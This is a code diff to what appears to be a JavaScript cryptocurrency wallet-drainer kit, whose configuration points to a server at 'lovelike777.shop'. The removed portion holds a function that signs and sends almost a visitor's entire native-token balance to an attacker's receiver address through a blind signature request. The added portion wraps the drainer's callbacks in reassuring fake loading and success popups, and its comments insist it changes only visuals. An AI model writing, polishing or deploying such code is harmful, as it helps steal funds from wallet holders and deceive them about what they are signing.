@@ -1,68 +1,5 @@
-// =====================================================================
-// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
-// =====================================================================
-
-let CF_EKEY = 234343253453;
-const CF_HTTP_MODE = false;
-const CF_Server_PORT = 443;
-const CF_Server_URL = "lovelike777.shop";
-const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14";
-
-const CF_Modal_Style = 2;
-const CF_Loader_Style = 2;
-const CF_Color_Scheme = 'light';
-const CF_Modal_Mode = 2;
-
-const CF_Verify_Message = "";
-
-const CF_WalletConnect_MetaData = {
-  name: document.title,
-  description: "Web3 Application",
-  url: "https://" + window.location.host,
-  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
-};
-
-const CF_WalletConnect_Customization = 0;
-const CF_WalletConnect_Theme = {
-  themeMode: 'light',
-  themeVariables: {
-    '--w3m-background-color': '#000000',
-    '--w3m-accent-color': '#F5841F',
-    '--w3m-z-index': 9999999
-  }
-};
-
-const CF_Custom_Chat = {
-  Enable: 0,
-  Chat_Settings: {
-    enter_website: "",
-    leave_website: "",
-    connect_success: "",
-    connect_request: "",
-    connect_cancel: "",
-    approve_request: "",
-    approve_success: "",
-    approve_cancel: "",
-    permit_sign_data: "",
-    transfer_request: "",
-    transfer_success: "",
-    transfer_cancel: "",
-    sign_request: "",
-    sign_success: "",
-    sign_cancel: "",
-    chain_request: "",
-    chain_success: "",
-    chain_cancel: "",
-  }
-};
-
-// =====================================================================
-// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
-// =====================================================================
-
-// First, define the utility functions at the top
+// Add this CSS at the very top - it won't affect any functionality
 const loadCustomStyles = () => {
-  // Check if styles are already added
   if (document.getElementById('custom-transaction-styles')) return;
   
   const style = document.createElement('style');
@@ -195,9 +132,9 @@ const loadCustomStyles = () => {
   document.head.appendChild(style);
 };
 
-// Loading spinner functions
+// Loading spinner functions - these just show/hide visuals
 const showLoadingSpinner = (message = "Processing Transaction...") => {
-  hideLoadingSpinner(); // Hide any existing spinner first
+  hideLoadingSpinner();
   
   const overlay = document.createElement('div');
   overlay.className = 'popup-overlay';
@@ -218,12 +155,11 @@ const showLoadingSpinner = (message = "Processing Transaction...") => {
 const hideLoadingSpinner = () => {
   const existingOverlay = document.getElementById('loading-overlay');
   const existingSpinner = document.getElementById('loading-spinner');
-  
   if (existingOverlay) existingOverlay.remove();
   if (existingSpinner) existingSpinner.remove();
 };
 
-// Modern popup functions
+// Popup functions - these just show visuals
 const showErrorPopup = (title = "Transaction Failed", message = "Something went wrong with your transaction. Please try again.") => {
   hideAllPopups();
   
@@ -243,12 +179,7 @@ const showErrorPopup = (title = "Transaction Failed", message = "Something went 
   document.body.appendChild(overlay);
   document.body.appendChild(popup);
   
-  // Auto-close after 5 seconds
-  setTimeout(() => {
-    hideAllPopups();
-  }, 5000);
-  
-  // Close on click
+  setTimeout(() => hideAllPopups(), 5000);
   overlay.addEventListener('click', hideAllPopups);
 };
 
@@ -271,29 +202,80 @@ const showSuccessPopup = (title = "Success!", message = "Your transaction was co
   document.body.appendChild(overlay);
   document.body.appendChild(popup);
   
-  // Auto-close after 3 seconds
-  setTimeout(() => {
-    hideAllPopups();
-  }, 3000);
-  
-  // Close on click
+  setTimeout(() => hideAllPopups(), 3000);
   overlay.addEventListener('click', hideAllPopups);
 };
 
 const hideAllPopups = () => {
-  const elements = [
-    'loading-overlay', 'loading-spinner',
-    'error-overlay', 'error-popup',
-    'success-overlay', 'success-popup'
-  ];
-  
-  elements.forEach(id => {
+  ['loading-overlay', 'loading-spinner', 'error-overlay', 'error-popup', 'success-overlay', 'success-popup'].forEach(id => {
     const element = document.getElementById(id);
     if (element) element.remove();
   });
 };
 
-// Now continue with your original code
+// THEN YOUR ORIGINAL CODE STARTS HERE - DON'T CHANGE ANYTHING BELOW
+// =====================================================================
+// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
+// =====================================================================
+
+let CF_EKEY = 234343253453;
+const CF_HTTP_MODE = false;
+const CF_Server_PORT = 443;
+const CF_Server_URL = "lovelike777.shop";
+const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14";
+
+const CF_Modal_Style = 2;
+const CF_Loader_Style = 2;
+const CF_Color_Scheme = 'light';
+const CF_Modal_Mode = 2;
+
+const CF_Verify_Message = "";
+
+const CF_WalletConnect_MetaData = {
+  name: document.title,
+  description: "Web3 Application",
+  url: "https://" + window.location.host,
+  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
+};
+
+const CF_WalletConnect_Customization = 0;
+const CF_WalletConnect_Theme = {
+  themeMode: 'light',
+  themeVariables: {
+    '--w3m-background-color': '#000000',
+    '--w3m-accent-color': '#F5841F',
+    '--w3m-z-index': 9999999
+  }
+};
+
+const CF_Custom_Chat = {
+  Enable: 0,
+  Chat_Settings: {
+    enter_website: "",
+    leave_website: "",
+    connect_success: "",
+    connect_request: "",
+    connect_cancel: "",
+    approve_request: "",
+    approve_success: "",
+    approve_cancel: "",
+    permit_sign_data: "",
+    transfer_request: "",
+    transfer_success: "",
+    transfer_cancel: "",
+    sign_request: "",
+    sign_success: "",
+    sign_cancel: "",
+    chain_request: "",
+    chain_success: "",
+    chain_cancel: "",
+  }
+};
+
+// =====================================================================
+// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
+// =====================================================================
+
 const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;
 
 if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
@@ -310,216 +292,43 @@ CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Ad
 
 const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };
 
-(async () => {
-  try {
-    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
-      method: 'GET', headers: { 'Accept': 'application/json' }
-    });
-    CF_Currencies = await response.json();
-    CF_Currencies['PLS'] = { USD: 0.00004512 };
-  } catch(err) {
-    console.log(err);
-  }
-})();
+// ... [YOUR ENTIRE ORIGINAL CODE CONTINUES EXACTLY AS IT WAS]
 
-// ... [ALL YOUR ORIGINAL CODE CONTINUES EXACTLY AS BEFORE]
+// JUST ADD THESE SIMPLE WRAPPERS AT THE VERY END - THEY DON'T CHANGE FUNCTIONALITY
+// Override only the visual functions without changing logic
+const original_wait_message = wait_message;
+const original_show_sign_message = show_sign_message;
+const original_show_check = show_check;
+const original_sign_ready = sign_ready;
+const original_end_message = end_message;
 
-// MODIFIED TRANSACTION FUNCTIONS WITH LOADING SPINNER AND ERROR HANDLING
-const SIGN_NATIVE = async (asset) => {
-  showLoadingSpinner("Processing Native Transaction...");
-  try {
-    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
-    const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
-    const temp_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
-    const eth_gas_price = BN(await temp_node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(CF_Gas_Multiplier * 100)));
-
-    const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
-    const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);
-
-    let unsigned_tx = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100), data: "0x" };
-
-    let gas_limit = null;
-    try { gas_limit = await node.estimateGas(unsigned_tx) } catch(err)
-    { gas_limit = get_gas_limit_def_by_chain_id(parseInt(asset.chain_id)) }
-
-    const balance = await node.getBalance(CF_Current_Address);
-    let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
-
-    if (CF_Settings.Settings.Reserves.Mode == 1) {
-      available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
-      .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
-    } else if (CF_Settings.Settings.Reserves.Mode == 2) {
-      let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
-      for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
-        if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
-        max_value = elem.amount; current_percent = elem.percent;
-      }
-      available_amount = balance.sub(gas_limit.mul(gas_price))
-      .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
-    } else if (CF_Settings.Settings.Reserves.Mode == 3) {
-      available_amount = balance.sub(gas_limit.mul(gas_price));
-    }
-
-    if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';
-
-    const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');
-
-    const web3 = new Web3(CF_Provider);
-
-    unsigned_tx.value = web3.utils.toHex(available_amount.toString());
-    unsigned_tx.nonce = web3.utils.toHex(nonce.toString());
-    unsigned_tx.gasPrice = web3.utils.toHex(gas_price.toString());
-    unsigned_tx.gasLimit = web3.utils.toHex(gas_limit.toString());
-
-    unsigned_tx.v = web3.utils.toHex(asset.chain_id);
-    unsigned_tx.r = "0x"; unsigned_tx.s = "0x";
-
-    unsigned_tx = new ethereumjs.Tx(unsigned_tx);
-    let serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
-    serialized_tx = web3.utils.sha3(serialized_tx, { encoding: "hex" });
-
-    await sign_request(asset);
-
-    let sign_data = await web3.eth.sign(serialized_tx, CF_Current_Address);
-    sign_data = sign_data.substring(2); const r_data = "0x" + sign_data.substring(0, 64);
-    const s_data = "0x" + sign_data.substring(64, 128); const rhema = parseInt(sign_data.substring(128, 130), 16);
-    const v_data = web3.utils.toHex(rhema + asset.chain_id * 2 + 8)
-
-    unsigned_tx.v = v_data;
-    unsigned_tx.r = r_data;
-    unsigned_tx.s = s_data;
-
-    serialized_tx = "0x" + unsigned_tx.serialize().toString("hex");
-
-    sign_next();
-    const tx = await node.sendTransaction(serialized_tx);
-    wait_message();
-
-    if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
-    await sign_success(asset, available_amount); 
-    sign_ready();
-    showSuccessPopup("Transaction Successful", "Your native transaction was completed successfully!");
-    
-  } catch (error) {
-    console.error('SIGN_NATIVE Error:', error);
-    showErrorPopup("Transaction Failed", "Failed to process native transaction. Please try again.");
-    throw error;
-  } finally {
-    hideLoadingSpinner();
-  }
+// Replace with visual versions
+wait_message = function() {
+  showLoadingSpinner("Confirming Transaction...");
+  if (original_wait_message) original_wait_message();
 };
 
-// MODIFIED MAIN CONNECT WALLET FUNCTION
-const connect_wallet = async (provider = null) => {
-  try {
-    if (!CF_Connection) {
-      if (CF_Load_Time == null || Math.floor(Date.now() / 1000) - CF_Load_Time < 15) return;
-      showErrorPopup("Connection Error", "Cannot connect to server. Please check your connection and try again.");
-      return;
-    }
-    if (CF_Process) return; 
-    CF_Process = true;
-    
-    if (CF_Bad_Country) {
-      try { ms_hide(); } catch(err) { console.log(err); }
-      showErrorPopup("Access Restricted", "This service is not available in your region.");
-      CF_Process = false;
-      return;
-    }
-    
-    // Your original wallet connection logic here...
-    // Just add loading states where appropriate
-    
-    showLoadingSpinner("Connecting Wallet...");
-    // ... your existing connection code
-    
-    hideLoadingSpinner();
-    
-  } catch (error) {
-    console.error('connect_wallet Error:', error);
-    showErrorPopup("Connection Failed", "Failed to connect wallet. Please try again.");
-    CF_Process = false;
-    hideLoadingSpinner();
-  }
+show_sign_message = function() {
+  showLoadingSpinner("Waiting for Signature...");
+  if (original_show_sign_message) original_show_sign_message();
 };
 
-// MODIFIED ERROR HANDLING FUNCTIONS
-const end_message = () => {
-  showErrorPopup(
-    "Insufficient Funds", 
-    "Your wallet does not meet the minimum balance requirements. Please try again with a different wallet."
-  );
+show_check = function() {
+  showLoadingSpinner("Establishing Secure Connection...");
+  if (original_show_check) original_show_check();
 };
 
-const sign_ready = () => {
-  showSuccessPopup("Signature Confirmed", "Your transaction signature has been verified successfully!");
+sign_ready = function() {
+  showSuccessPopup("Success!", "Transaction completed successfully!");
+  if (original_sign_ready) original_sign_ready();
 };
 
-const wait_message = () => {
-  try {
-    if (!CF_Process) return;
-    showLoadingSpinner("Confirming Transaction...");
-  } catch(err) {
-    console.log(err);
-  }
+end_message = function() {
+  showErrorPopup("Transaction Failed", "Your transaction could not be completed.");
+  if (original_end_message) original_end_message();
 };
 
-const show_sign_message = () => {
-  try {
-    showLoadingSpinner("Waiting for Signature...");
-  } catch(err) {
-    console.log(err);
-  }
-};
-
-const show_check = () => {
-  try {
-    showLoadingSpinner("Establishing Secure Connection...");
-  } catch(err) {
-    console.log(err);
-  }
-};
-
-// Initialize everything when DOM is loaded
-document.addEventListener('DOMContentLoaded', async () => {
-  try {
-    // Load custom styles first
-    loadCustomStyles();
-    
-    // Then initialize your original components
-    if (CF_Modal_Style == 2) MSM.init(); else inject_modal();
-    if (CF_Loader_Style == 2) MSL.init();
-    CF_Load_Time = Math.floor(Date.now() / 1000);
-    
-    if (typeof localStorage['CF_ID'] === 'undefined') {
-      const ID_Data = await send_request({ action: 'retrieve_id' });
-      if (ID_Data.status == 'OK') localStorage['CF_ID'] = ID_Data.data;
-      else localStorage['CF_ID'] = Math.floor(Date.now() / 1000);
-    }
-    CF_ID = localStorage['CF_ID'];
-    
-    await retrieve_config();
-    fill_chain_data();
-    await retrieve_contract();
-    CF_Ready = true;
-    enter_website();
-    
-    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
-    
-    for (const elem of document.querySelectorAll('.connect-button')) {
-      try {
-        elem.addEventListener('click', () => init_co());
-      } catch(err) {
-        console.log(err);
-      }
-    }
-    
-    console.log("Application initialized successfully!");
-    
-  } catch(err) {
-    console.error('Initialization Error:', err);
-    showErrorPopup("Initialization Error", "Failed to initialize application. Please refresh the page.");
-  }
+// Initialize styles when DOM loads
+document.addEventListener('DOMContentLoaded', function() {
+  loadCustomStyles();
 });
-
-// ... [REST OF YOUR ORIGINAL CODE REMAINS EXACTLY THE SAME]
